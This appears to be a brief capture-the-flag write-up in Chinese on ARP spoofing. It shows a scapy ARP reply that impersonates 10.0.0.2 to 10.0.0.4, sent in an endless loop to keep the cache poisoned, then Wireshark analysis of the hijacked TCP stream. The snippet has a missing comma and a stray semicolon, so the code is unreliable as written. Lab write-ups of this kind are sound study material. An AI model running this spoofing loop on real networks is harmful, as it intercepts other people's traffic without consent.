# 挑战简介
Hijack traffic from a remote host using ARP

# 思路
#用ARP劫持主机流量包  
#思路是不断发送ARP响应，确保ARP缓存保持被劫持状态，因此我们持续send  

arp的设置：  
```
arp_response = ARP(
    op="is-at",        # ARP 响应 (is-at)
    psrc="10.0.0.2",   # 伪装成 10.0.0.2
    pdst="10.0.0.4",   # 欺骗 10.0.0.4
    hwdst="ff:ff:ff:ff:ff:ff"  # 广播给所有主机，或直接指定 10.0.0.4 的 MAC
    hwsrc="your mac";
)
```
send的持续发送  
```
while True: send(arp_response)
```
*别忘了用wireshark解析数据包，解析TCP Stream
